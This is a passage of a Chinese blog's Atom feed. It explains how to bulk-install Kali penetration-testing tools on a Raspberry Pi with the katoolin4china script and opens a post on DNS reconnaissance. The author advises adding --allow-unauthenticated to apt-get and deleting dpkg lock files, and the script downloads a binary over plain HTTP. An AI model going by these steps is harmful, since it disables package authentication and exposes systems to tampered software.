Pi. Although it can be run</p><p>at any time, some of the options may have difficulties if</p><p>you have heavily customised your installation.</p><p>A10 Update<br>将Raspi-config（Raspberry Pi Software Configuration Tool）这个工具升级到最新版</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;树莓派3B配置&quot;&gt;&lt;a href=&quot;#树莓派3B配置&quot; class=&quot;headerlink&quot; title=&quot;树莓派3B配置&quot;&gt;&lt;/a&gt;树莓派3B配置&lt;/h1&gt;&lt;p&gt;&lt;a</summary>
        
      
    
    
    
    <category term="树莓派" scheme="https://kabeor.github.io/categories/%E6%A0%91%E8%8E%93%E6%B4%BE/"/>
    
    
    <category term="Kali" scheme="https://kabeor.github.io/tags/Kali/"/>
    
    <category term="树莓派" scheme="https://kabeor.github.io/tags/%E6%A0%91%E8%8E%93%E6%B4%BE/"/>
    
  </entry>
  
  <entry>
    <title>树莓派系统（基于Debian）安装kali工具</title>
    <link href="https://kabeor.github.io/%E6%A0%91%E8%8E%93%E6%B4%BE%E7%B3%BB%E7%BB%9F%EF%BC%88%E5%9F%BA%E4%BA%8EDebian%EF%BC%89%E5%AE%89%E8%A3%85kali%E5%B7%A5%E5%85%B7/"/>
    <id>https://kabeor.github.io/%E6%A0%91%E8%8E%93%E6%B4%BE%E7%B3%BB%E7%BB%9F%EF%BC%88%E5%9F%BA%E4%BA%8EDebian%EF%BC%89%E5%AE%89%E8%A3%85kali%E5%B7%A5%E5%85%B7/</id>
    <published>2018-02-09T16:00:00.000Z</published>
    <updated>2020-03-16T04:35:54.019Z</updated>
    
    <content type="html"><![CDATA[<h1 id="树莓派系统（基于Debian）安装kali工具"><a href="#树莓派系统（基于Debian）安装kali工具" class="headerlink" title="树莓派系统（基于Debian）安装kali工具"></a>树莓派系统（基于Debian）安装kali工具</h1><blockquote><p>软件</p></blockquote><p>katoolin4china</p><p>原软件为katoolin，katoolin4china将内部的软件源改为清华源，对国内用户更友好</p><p>katoolin<br><a href="https://github.com/LionSec/katoolin" target="_blank" rel="noopener">https://github.com/LionSec/katoolin</a></p><p>katoolin4china<br><a href="https://github.com/SuperSuperSuperSuper5/katoolin4china" target="_blank" rel="noopener">https://github.com/SuperSuperSuperSuper5/katoolin4china</a></p><blockquote><p>使用方法</p></blockquote><ol><li>先将这个仓库clone下来</li></ol><p>先安装git<br><code>sudo apt-get install git</code><br>为了以后的方便管理，在/home/目录下，先建一个目录，将克隆的东西放进去</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir Kalitool</span><br><span class="line">cd Kalitool</span><br></pre></td></tr></table></figure></div><p>开始克隆</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;SuperSuperSuperSuper5&#x2F;katoolin4china.git</span><br></pre></td></tr></table></figure></div><p>现在本地目录下已经有一个文件夹了，进去</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd katoolin4china</span><br><span class="line">sudo cp katoolin4china.py &#x2F;usr&#x2F;bin&#x2F;katoolin4china</span><br><span class="line">sudo chmod +x  &#x2F;usr&#x2F;bin&#x2F;katoolin4china</span><br></pre></td></tr></table></figure></div><p>然后就可以使用这个工具了<br><code>sudo katoolin4china</code></p><ol start="2"><li><p>配置katoolin4china</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$$\   $$\             $$\                         $$\ $$\           </span><br><span class="line">$$ | $$  |            $$ |                        $$ |\__|          </span><br><span class="line">$$ |$$  &#x2F;  $$$$$$\  $$$$$$\    $$$$$$\   $$$$$$\  $$ |$$\ $$$$$$$\  </span><br><span class="line">$$$$$  &#x2F;   \____$$\ \_$$  _|  $$  __$$\ $$  __$$\ $$ |$$ |$$  __$$\ </span><br><span class="line">$$  $$&lt;    $$$$$$$ |  Kali linux tools installer |$$ |$$ |$$ |  $$ |</span><br><span class="line">$$ |\$$\  $$  __$$ |  $$ |$$\ $$ |  $$ |$$ |  $$ |$$ |$$ |$$ |  $$ |</span><br><span class="line">$$ | \$$\ \$$$$$$$ |  \$$$$  |\$$$$$$  |\$$$$$$  |$$ |$$ |$$ |  $$ |</span><br><span class="line">\__|  \__| \_______|   \____&#x2F;  \______&#x2F;  \______&#x2F; \__|\__|\__|  \__| V1.0 </span><br><span class="line">+ -- -- +&#x3D;[ Author: LionSec | Homepage: www.lionsec.net</span><br><span class="line">+ -- -- +&#x3D;[ 330 Tools </span><br><span class="line">1) Add Kali repositories &amp; Update </span><br><span class="line">2) View Categories</span><br><span class="line">3) Install classicmenu indicator</span><br><span class="line">4) Install Kali menu</span><br><span class="line">5) Help</span><br></pre></td></tr></table></figure></div><p>按2查看可使用的工具</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kat &gt; 2</span><br><span class="line">**************************** All Categories *****************************</span><br><span class="line">1) Information Gathering            8) Exploitation Tools</span><br><span class="line">2) Vulnerability Analysis           9) Forensics Tools</span><br><span class="line">3) Wireless Attacks             10) Stress Testing</span><br><span class="line">4) Web Applications             11) Password Attacks</span><br><span class="line">5) Sniffing &amp; Spoofing              12) Reverse Engineering</span><br><span class="line">6) Maintaining Access               13) Hardware Hacking</span><br><span class="line">7) Reporting Tools              14) Extra</span><br><span class="line">0) All</span><br><span class="line">Select a category or press (0) to install all Kali linux tools .</span><br></pre></td></tr></table></figure></div><p>按0全部安装</p></li><li><p>第三步：移除kali的源</p></li></ol><p>目前最新的版本已经在退出时自动移除kali源了，所以不需要再手动去1里清除。</p><p>最好不要再手动清除了，因为这样做之后我的源就全没了，还得把/etc/apt/sources.list和/etc/apt/sources.list.d/raspi.list重新配置一遍</p><h1 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h1><blockquote><ol><li>不要再手动清除源了。。。</li></ol></blockquote><blockquote><ol start="2"><li>忽略认证警告</li></ol></blockquote><p>在安装的时候，我的系统会提示是否继续（Y/n）和未认证是否继续安装（y/N）。。。注意这里的大小写，大写说明为默认选项，也就是你直接回车等于选大写的选项，而在py文件中执行的代码如下</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> _________</span><br><span class="line">| 2 floor |</span><br><span class="line">\033[1;36m**************************** All Categories *****************************\033[1;m</span><br><span class="line">1) Information Gathering            8) Exploitation Tools</span><br><span class="line">2) Vulnerability Analysis           9) Forensics Tools</span><br><span class="line">3) Wireless Attacks                 10) Stress Testing</span><br><span class="line">4) Web Applications                 11) Password Attacks</span><br><span class="line">5) Sniffing &amp; Spoofing              12) Reverse Engineering</span><br><span class="line">6) Maintaining Access               13) Hardware Hacking</span><br><span class="line">7) Reporting Tools                  14) Extra</span><br><span class="line">                                    </span><br><span class="line">0) All</span><br><span class="line">plus) Remove all kali tool</span><br><span class="line">             &#39;&#39;&#39;)</span><br><span class="line">                        print (&quot;\033[1;32mSelect a category or press (0) to install all Kali linux tools .\n\033[1;m&quot;)</span><br><span class="line"></span><br><span class="line">                        option1 &#x3D; raw_input(&quot;\033[1;36mkat &gt; \033[1;m&quot;)</span><br><span class="line">                        if option1 &#x3D;&#x3D; &quot;back&quot;:</span><br><span class="line">                            inicio1()</span><br><span class="line"></span><br><span class="line">                        elif option1 &#x3D;&#x3D; &quot;gohome&quot;:</span><br><span class="line">                            inicio1()</span><br><span class="line"></span><br><span class="line">                        elif option1 &#x3D;&#x3D; &quot;plus&quot;:</span><br><span class="line">                            kalitool &#x3D; [&quot;acccheck&quot;, &quot;ace-voip&quot;, &quot;amap&quot;, &quot;automater&quot;, &quot;braa&quot;, &quot;casefile&quot;, &quot;cdpsnarf&quot;, &quot;cisco-torch&quot;, &quot;cookie-cadger&quot;, &quot;copy-router-config&quot;, &quot;dmitry&quot;, &quot;dnmap&quot;, &quot;dnsenum&quot;, &quot;dnsmap&quot;, &quot;dnsrecon&quot;, &quot;dnstracer&quot;, &quot;dnswalk&quot;, &quot;dotdotpwn&quot;, &quot;enum4linux&quot;, &quot;enumiax&quot;, &quot;exploitdb&quot;, &quot;fierce&quot;, &quot;firewalk&quot;, &quot;fragroute&quot;, &quot;fragrouter&quot;, &quot;ghost-phisher&quot;, &quot;golismero&quot;, &quot;goofile&quot;, &quot;lbd&quot;, &quot;maltego-teeth&quot;, &quot;masscan&quot;, &quot;miranda&quot;, &quot;nmap&quot;, &quot;parsero&quot;, &quot;recon-ng&quot;, &quot;smtp-user-enum&quot;, &quot;snmpcheck&quot;, &quot;sslcaudit&quot;, &quot;sslsplit&quot;, &quot;sslyze&quot;, &quot;theharvester&quot;, &quot;tlssled&quot;, &quot;twofi&quot;, &quot;urlcrazy&quot;, &quot;wol-e&quot;, &quot;intrace&quot;, &quot;hping3&quot;, &quot;bbqsql&quot;, &quot;bed&quot;, &quot;cisco-auditing-tool&quot;, &quot;cisco-global-exploiter&quot;, &quot;cisco-ocs&quot;, &quot;doona&quot;, &quot;greenbone-security-assistant&quot;, &quot;hexorbase&quot;, &quot;jsql&quot;, &quot;lynis&quot;, &quot;openvas-cli&quot;, &quot;openvas-manager&quot;, &quot;openvas-scanner&quot;, &quot;oscanner&quot;, &quot;powerfuzzer&quot;, &quot;sfuzz&quot;, &quot;sidguesser&quot;, &quot;siparmyknife&quot;, &quot;sqlmap&quot;, &quot;sqlninja&quot;, &quot;sqlsus&quot;, &quot;tnscmd10g&quot;, &quot;unix-privesc-check&quot;, &quot;yersinia&quot;, &quot;aircrack-ng&quot;, &quot;asleap&quot;, &quot;bluelog&quot;, &quot;blueranger&quot;, &quot;bluesnarfer&quot;, &quot;bully&quot;, &quot;cowpatty&quot;, &quot;crackle&quot;, &quot;eapmd5pass&quot;, &quot;fern-wifi-cracker&quot;, &quot;giskismet&quot;, &quot;gqrx&quot;, &quot;kalibrate-rtl&quot;, &quot;killerbee&quot;, &quot;kismet&quot;, &quot;mdk3&quot;, &quot;mfcuk&quot;, &quot;mfoc&quot;, &quot;mfterm&quot;, &quot;multimon-ng&quot;, &quot;pixiewps&quot;, &quot;reaver&quot;, &quot;redfang&quot;, &quot;spooftooph&quot;, &quot;wifi-honey&quot;, &quot;wifitap&quot;, &quot;wifite&quot;, &quot;apache-users&quot;, &quot;arachni&quot;, &quot;blindelephant&quot;, &quot;burpsuite&quot;, &quot;cutycapt&quot;, &quot;davtest&quot;, &quot;deblaze&quot;, &quot;dirb&quot;, &quot;dirbuster&quot;, &quot;fimap&quot;, &quot;funkload&quot;, &quot;grabber&quot;, &quot;jboss-autopwn&quot;, &quot;joomscan&quot;, &quot;padbuster&quot;, &quot;paros&quot;, &quot;plecost&quot;, &quot;proxystrike&quot;, &quot;skipfish&quot;, &quot;ua-tester&quot;, &quot;uniscan&quot;, &quot;vega&quot;, &quot;w3af&quot;, &quot;webscarab&quot;, &quot;websploit&quot;, &quot;wfuzz&quot;, &quot;wpscan&quot;, &quot;xsser&quot;, &quot;zaproxy&quot;, &quot;dnschef&quot;, &quot;fiked&quot;, &quot;hamster-sidejack&quot;, &quot;hexinject&quot;, &quot;iaxflood&quot;, &quot;inviteflood&quot;, &quot;ismtp&quot;, &quot;mitmproxy&quot;, &quot;ohrwurm&quot;, &quot;protos-sip&quot;, &quot;rebind&quot;, &quot;responder&quot;, &quot;rtpbreak&quot;, &quot;rtpinsertsound&quot;, &quot;rtpmixsound&quot;, &quot;sctpscan&quot;, &quot;sipp&quot;, &quot;sipvicious&quot;, &quot;sniffjoke&quot;, &quot;sslstrip&quot;, &quot;thc-ipv6&quot;, &quot;voiphopper&quot;, &quot;wireshark&quot;, &quot;xspy&quot;, &quot;cryptcat&quot;, &quot;cymothoa&quot;, &quot;dbd&quot;, &quot;dns2tcp&quot;, &quot;http-tunnel&quot;, &quot;httptunnel&quot;, &quot;intersect&quot;, &quot;nishang&quot;, &quot;polenum&quot;, &quot;powersploit&quot;, &quot;pwnat&quot;, &quot;ridenum&quot;, &quot;sbd&quot;, &quot;u3-pwn&quot;, &quot;webshells&quot;, &quot;weevely&quot;, &quot;dos2unix&quot;, &quot;dradis&quot;, &quot;keepnote&quot;, &quot;magictree&quot;, &quot;metagoofil&quot;, &quot;nipper-ng&quot;, &quot;pipal&quot;, &quot;armitage&quot;, &quot;backdoor-factory&quot;, &quot;linux-exploit-suggester&quot;, &quot;set&quot;, &quot;shellnoob&quot;, &quot;beef-xss&quot;, &quot;binwalk&quot;, &quot;bulk-extractor&quot;, &quot;chntpw&quot;, &quot;cuckoo&quot;, &quot;dc3dd&quot;, &quot;ddrescue&quot;, &quot;dumpzilla&quot;, &quot;extundelete&quot;, &quot;foremost&quot;, &quot;galleta&quot;, &quot;guymager&quot;, &quot;iphone-backup-analyzer&quot;, &quot;p0f&quot;, &quot;pdf-parser&quot;, &quot;pdfid&quot;, &quot;pdgmail&quot;, &quot;peepdf&quot;, &quot;volatility&quot;, &quot;xplico&quot;, &quot;dhcpig&quot;, &quot;ipv6-toolkit&quot;, &quot;rtpflood&quot;, &quot;slowhttptest&quot;, &quot;t50&quot;, &quot;termineter&quot;, &quot;thc-ssl-dos&quot;, &quot;cewl&quot;, &quot;cmospwd&quot;, &quot;creddump&quot;, &quot;crunch&quot;, &quot;findmyhash&quot;, &quot;gpp-decrypt&quot;, &quot;hash-identifier&quot;, &quot;john&quot;, &quot;johnny&quot;, &quot;keimpx&quot;, &quot;maskprocessor&quot;, &quot;multiforcer&quot;, &quot;ncrack&quot;, &quot;oclgausscrack&quot;, &quot;pack&quot;, &quot;patator&quot;, &quot;rainbowcrack&quot;, &quot;rcracki-mt&quot;, &quot;rsmangler&quot;, &quot;statsprocessor&quot;, &quot;thc-pptp-bruter&quot;, &quot;truecrack&quot;, &quot;wordlists&quot;, &quot;apktool&quot;, &quot;dex2jar&quot;, &quot;python-distorm3&quot;, &quot;edb-debugger&quot;, &quot;jad&quot;, &quot;javasnoop&quot;, &quot;jd&quot;, &quot;ollydbg&quot;, &quot;smali&quot;, &quot;valgrind&quot;, &quot;yara&quot;, &quot;android-sdk&quot;, &quot;arduino&quot;, &quot;sakis3g&quot;]</span><br><span class="line">                            for k_remove in kalitool:</span><br><span class="line">                                print (&quot;\033[1;36mRemove\033[1;m \033[1;32m%s\033[1;m&quot; % k_remove)</span><br><span class="line">                                cmd &#x3D; os.system(&quot;apt-get -y autoremove %s&quot; % k_remove)</span><br><span class="line"></span><br><span class="line">                        elif option1 &#x3D;&#x3D; &quot;0&quot;:</span><br><span class="line">                            kalitool &#x3D; [&quot;acccheck&quot;, &quot;ace-voip&quot;, &quot;amap&quot;, &quot;automater&quot;, &quot;braa&quot;, &quot;casefile&quot;, &quot;cdpsnarf&quot;, &quot;cisco-torch&quot;, &quot;cookie-cadger&quot;, &quot;copy-router-config&quot;, &quot;dmitry&quot;, &quot;dnmap&quot;, &quot;dnsenum&quot;, &quot;dnsmap&quot;, &quot;dnsrecon&quot;, &quot;dnstracer&quot;, &quot;dnswalk&quot;, &quot;dotdotpwn&quot;, &quot;enum4linux&quot;, &quot;enumiax&quot;, &quot;exploitdb&quot;, &quot;fierce&quot;, &quot;firewalk&quot;, &quot;fragroute&quot;, &quot;fragrouter&quot;, &quot;ghost-phisher&quot;, &quot;golismero&quot;, &quot;goofile&quot;, &quot;lbd&quot;, &quot;maltego-teeth&quot;, &quot;masscan&quot;, &quot;miranda&quot;, &quot;nmap&quot;, &quot;parsero&quot;, &quot;recon-ng&quot;, &quot;smtp-user-enum&quot;, &quot;snmpcheck&quot;, &quot;sslcaudit&quot;, &quot;sslsplit&quot;, &quot;sslyze&quot;, &quot;theharvester&quot;, &quot;tlssled&quot;, &quot;twofi&quot;, &quot;urlcrazy&quot;, &quot;wol-e&quot;, &quot;intrace&quot;, &quot;hping3&quot;, &quot;bbqsql&quot;, &quot;bed&quot;, &quot;cisco-auditing-tool&quot;, &quot;cisco-global-exploiter&quot;, &quot;cisco-ocs&quot;, &quot;doona&quot;, &quot;greenbone-security-assistant&quot;, &quot;hexorbase&quot;, &quot;jsql&quot;, &quot;lynis&quot;, &quot;openvas-cli&quot;, &quot;openvas-manager&quot;, &quot;openvas-scanner&quot;, &quot;oscanner&quot;, &quot;powerfuzzer&quot;, &quot;sfuzz&quot;, &quot;sidguesser&quot;, &quot;siparmyknife&quot;, &quot;sqlmap&quot;, &quot;sqlninja&quot;, &quot;sqlsus&quot;, &quot;tnscmd10g&quot;, &quot;unix-privesc-check&quot;, &quot;yersinia&quot;, &quot;aircrack-ng&quot;, &quot;asleap&quot;, &quot;bluelog&quot;, &quot;blueranger&quot;, &quot;bluesnarfer&quot;, &quot;bully&quot;, &quot;cowpatty&quot;, &quot;crackle&quot;, &quot;eapmd5pass&quot;, &quot;fern-wifi-cracker&quot;, &quot;giskismet&quot;, &quot;gqrx&quot;, &quot;kalibrate-rtl&quot;, &quot;killerbee&quot;, &quot;kismet&quot;, &quot;mdk3&quot;, &quot;mfcuk&quot;, &quot;mfoc&quot;, &quot;mfterm&quot;, &quot;multimon-ng&quot;, &quot;pixiewps&quot;, &quot;reaver&quot;, &quot;redfang&quot;, &quot;spooftooph&quot;, &quot;wifi-honey&quot;, &quot;wifitap&quot;, &quot;wifite&quot;, &quot;apache-users&quot;, &quot;arachni&quot;, &quot;blindelephant&quot;, &quot;burpsuite&quot;, &quot;cutycapt&quot;, &quot;davtest&quot;, &quot;deblaze&quot;, &quot;dirb&quot;, &quot;dirbuster&quot;, &quot;fimap&quot;, &quot;funkload&quot;, &quot;grabber&quot;, &quot;jboss-autopwn&quot;, &quot;joomscan&quot;, &quot;padbuster&quot;, &quot;paros&quot;, &quot;plecost&quot;, &quot;proxystrike&quot;, &quot;skipfish&quot;, &quot;ua-tester&quot;, &quot;uniscan&quot;, &quot;vega&quot;, &quot;w3af&quot;, &quot;webscarab&quot;, &quot;websploit&quot;, &quot;wfuzz&quot;, &quot;wpscan&quot;, &quot;xsser&quot;, &quot;zaproxy&quot;, &quot;dnschef&quot;, &quot;fiked&quot;, &quot;hamster-sidejack&quot;, &quot;hexinject&quot;, &quot;iaxflood&quot;, &quot;inviteflood&quot;, &quot;ismtp&quot;, &quot;mitmproxy&quot;, &quot;ohrwurm&quot;, &quot;protos-sip&quot;, &quot;rebind&quot;, &quot;responder&quot;, &quot;rtpbreak&quot;, &quot;rtpinsertsound&quot;, &quot;rtpmixsound&quot;, &quot;sctpscan&quot;, &quot;sipp&quot;, &quot;sipvicious&quot;, &quot;sniffjoke&quot;, &quot;sslstrip&quot;, &quot;thc-ipv6&quot;, &quot;voiphopper&quot;, &quot;wireshark&quot;, &quot;xspy&quot;, &quot;cryptcat&quot;, &quot;cymothoa&quot;, &quot;dbd&quot;, &quot;dns2tcp&quot;, &quot;http-tunnel&quot;, &quot;httptunnel&quot;, &quot;intersect&quot;, &quot;nishang&quot;, &quot;polenum&quot;, &quot;powersploit&quot;, &quot;pwnat&quot;, &quot;ridenum&quot;, &quot;sbd&quot;, &quot;u3-pwn&quot;, &quot;webshells&quot;, &quot;weevely&quot;, &quot;dos2unix&quot;, &quot;dradis&quot;, &quot;keepnote&quot;, &quot;magictree&quot;, &quot;metagoofil&quot;, &quot;nipper-ng&quot;, &quot;pipal&quot;, &quot;armitage&quot;, &quot;backdoor-factory&quot;, &quot;linux-exploit-suggester&quot;, &quot;set&quot;, &quot;shellnoob&quot;, &quot;beef-xss&quot;, &quot;binwalk&quot;, &quot;bulk-extractor&quot;, &quot;chntpw&quot;, &quot;cuckoo&quot;, &quot;dc3dd&quot;, &quot;ddrescue&quot;, &quot;dumpzilla&quot;, &quot;extundelete&quot;, &quot;foremost&quot;, &quot;galleta&quot;, &quot;guymager&quot;, &quot;iphone-backup-analyzer&quot;, &quot;p0f&quot;, &quot;pdf-parser&quot;, &quot;pdfid&quot;, &quot;pdgmail&quot;, &quot;peepdf&quot;, &quot;volatility&quot;, &quot;xplico&quot;, &quot;dhcpig&quot;, &quot;ipv6-toolkit&quot;, &quot;rtpflood&quot;, &quot;slowhttptest&quot;, &quot;t50&quot;, &quot;termineter&quot;, &quot;thc-ssl-dos&quot;, &quot;cewl&quot;, &quot;cmospwd&quot;, &quot;creddump&quot;, &quot;crunch&quot;, &quot;findmyhash&quot;, &quot;gpp-decrypt&quot;, &quot;hash-identifier&quot;, &quot;john&quot;, &quot;johnny&quot;, &quot;keimpx&quot;, &quot;maskprocessor&quot;, &quot;multiforcer&quot;, &quot;ncrack&quot;, &quot;oclgausscrack&quot;, &quot;pack&quot;, &quot;patator&quot;, &quot;rainbowcrack&quot;, &quot;rcracki-mt&quot;, &quot;rsmangler&quot;, &quot;statsprocessor&quot;, &quot;thc-pptp-bruter&quot;, &quot;truecrack&quot;, &quot;wordlists&quot;, &quot;apktool&quot;, &quot;dex2jar&quot;, &quot;python-distorm3&quot;, &quot;edb-debugger&quot;, &quot;jad&quot;, &quot;javasnoop&quot;, &quot;jd&quot;, &quot;ollydbg&quot;, &quot;smali&quot;, &quot;valgrind&quot;, &quot;yara&quot;, &quot;android-sdk&quot;, &quot;arduino&quot;, &quot;sakis3g&quot;]</span><br><span class="line">                            kt_count &#x3D; 1</span><br><span class="line">                            kt_len &#x3D; len(kalitool)</span><br><span class="line">                            for kt in kalitool:</span><br><span class="line">                                print (&quot;\033[1;36mInstall\033[1;m \033[1;32m%s        %d &#x2F; %d\033[1;m&quot; % (kt, kt_count, kt_len))</span><br><span class="line">                                cmd &#x3D; os.system(&quot;apt-get -f -y install %s&quot; % kt)</span><br><span class="line">                                if not cmd:</span><br><span class="line">                                    print (&quot;The system return \033[1;31m%d\033[1;m&quot; % cmd)</span><br><span class="line">                                kt_count +&#x3D; 1</span><br><span class="line">                            cmd &#x3D; os.system(&quot;wget http:&#x2F;&#x2F;www.morningstarsecurity.com&#x2F;downloads&#x2F;bing-ip2hosts-0.4.tar.gz &amp;&amp; tar -xzvf bing-ip2hosts-0.4.tar.gz &amp;&amp; cp bing-ip2hosts-0.4&#x2F;bing-ip2hosts &#x2F;usr&#x2F;local&#x2F;bin&#x2F;&quot;)</span><br><span class="line"></span><br><span class="line">                        while option1 &#x3D;&#x3D; &quot;1&quot;:</span><br><span class="line">                            print (&#39;&#39;&#39;</span><br></pre></td></tr></table></figure></div><p>就拿0,也就是全部安装来看，其他也一样的<br>按0后执行的语句为<br><code>cmd = os.system(&quot;apt-get -f -y install %s&quot; % kt)</code><br>可以看到，这里使用的是-y，而-y的意思是：</p><pre><code>使用-y选项会在安装过程中使用默认设置，如果默认设置为N，那么就会选择N，而不会选择y。并没有让apt-get一直选择y的选项。</code></pre><p>所以我如果直接安装就相当于自动选择继续（Y）后选择了程序未认证，不安装（N），也就不可能装上，当然如果你一个一个安装就可以自己选择，但如果我们想要大批量安装，就需要一个自动化的命令，所以我们需要修改一开始安装的位置和/usr/bin里的katoolin4china.py文件<br>我的位置如下</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vi &#x2F;home&#x2F;pi&#x2F;katoolin4china&#x2F;katoolin4china.py</span><br><span class="line">和</span><br><span class="line">vi &#x2F;usr&#x2F;bin&#x2F;katoolin4china.py</span><br></pre></td></tr></table></figure></div><p>修改上面那条语句，在%s后加上 –allow-unauthenticated,记得s后加空格<br><code>cmd = os.system(&quot;apt-get -f -y install %s --allow-unauthenticated&quot; % kt)</code></p><p>这样就可以了</p><blockquote><ol start="3"><li>在安装过程中手动终止后再次安装出现错误</li></ol></blockquote><p>我在调试上面的代码时就终止了几次，出现了以下错误：</p><pre><code>目标。。。在。。。和。。。中被配置了多次</code></pre><p>这是因为你的源被软件添加多次，我们需要把源文件中所有kali’源删掉</p><p>还遇到一种错误</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">E: 无法获得锁 &#x2F;var&#x2F;cache&#x2F;apt&#x2F;archives&#x2F;lock - open (11: 资源暂时不可用)</span><br><span class="line">E: 无法对目录 &#x2F;var&#x2F;cache&#x2F;apt&#x2F;archives&#x2F; 加锁</span><br></pre></td></tr></table></figure></div><p>这时我们要删除锁</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo rm &#x2F;var&#x2F;cache&#x2F;apt&#x2F;archives&#x2F;lock</span><br><span class="line">sudo rm &#x2F;var&#x2F;lib&#x2F;dpkg&#x2F;lock</span><br></pre></td></tr></table></figure></div><p>就行了</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;树莓派系统（基于Debian）安装kali工具&quot;&gt;&lt;a href=&quot;#树莓派系统（基于Debian）安装kali工具&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    
    <category term="Kali" scheme="https://kabeor.github.io/tags/Kali/"/>
    
    <category term="树莓派" scheme="https://kabeor.github.io/tags/%E6%A0%91%E8%8E%93%E6%B4%BE/"/>
    
  </entry>
  
  <entry>
    <title>DNS信息收集</title>
    <link href="https://kabeor.github.io/DNS%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>https://kabeor.github.io/DNS%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
    <published>2018-02-06T16:00:00.000Z</published>
    <updated>2020-03-16T04:42:43.273Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DNS信息收集"><a href="#DNS信息收集" class="headerlink" title="DNS信息收集"></a>DNS信息收集</h1><h2 id="1-DNS"><a href="#1-DNS" class="headerlink" title="1. DNS"></a>1. DNS</h2><p>域名系统（英文：Domain Name System，DNS）是因特网的一项服务，它作为将域名和IP地址相互映射的一个分布式数据库，能够使人更方便的访问互联网。DNS 使用TCP和UDP端口53。当前，对于每一级域名长度的限制是63个字符，域名总长度则不能超过253个字符。</p><h3 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h3><p>举一个例子，zh.wikipedia.org作为一个域名就和IP地址208.80.154.225相对应。DNS就像是一个自动的电话号码簿，我们可以直接拨打wikipedia的名字来代替电话号码（IP地址）。DNS在我们直接调用网站的名字以后就会将像zh.wikipedia.org一样便于人类使用的名字转化成像208.80.154.225一样便于机器识别的IP地址。</p><p>DNS查询有两种方式：递归和迭代。DNS客户端设置使用的DNS服务器一般都是递归服务器，它负责全权处理客户端的DNS查询请求，直到返回最终结果。而DNS服务器之间一般采用迭代查询方式。</p><p>以查询zh.wikipedia.org为例：</p><p>客户端发送查询报文”query zh.wikipedia.org”至DNS服务器，DNS服务器首先检查自身缓存，如果存在记录则直接返回结果。<br>如果记录老化或不存在，则</p><blockquote><ol><li>DNS服务器向根域名服务器发送查询报文”query zh.wikipedia.org”，根域名服务器返回.org域的权威域名服务器地址，这一级首先会返回的是顶级域名的权威域名服务器。</li><li>DNS服务器向.org域的权威域名服务器发送查询报文”query zh.wikipedia.org”，得到.wikipedia.org域的权威域名服务器地址。</li><li>DNS服务器向.wikipedia.org域的权威域名服务器发送查询报文”query zh.wikipedia.org”，得到主机zh的A记录，存入自身缓存并返回给客户端。</li></ol></blockquote><p>当 DNS 客户端需要查询程序中使用的名称时，它会查询 DNS 服务器来解析该名称。客户端发送的每条查询消息都包括三条信息，指定服务器回答的问题：</p><blockquote><ul><li>指定的 DNS 域名，规定为完全合格的域名 (FQDN)</li></ul></blockquote><blockquote><ul><li>指定的查询类型，可根据类型指定资源记录，或者指定查询操作的专用类型。</li></ul></blockquote><blockquote><ul><li>DNS 域名的指定类别。</li></ul></blockquote><p>DNS 查询进程分两部分进行：</p><blockquote><ul><li>名称查询从客户端计算机开始，并传输至解析程序即 DNS 客户端服务程序进行解析。</li></ul></blockquote><blockquote><ul><li>不能在本地解析查询时，可根据需要查询 DNS 服务器来解析名称。</li></ul></blockquote><h2 id="2-WhoIs查询"><a href="#2-WhoIs查询" class="headerlink" title="2. WhoIs查询"></a>2. 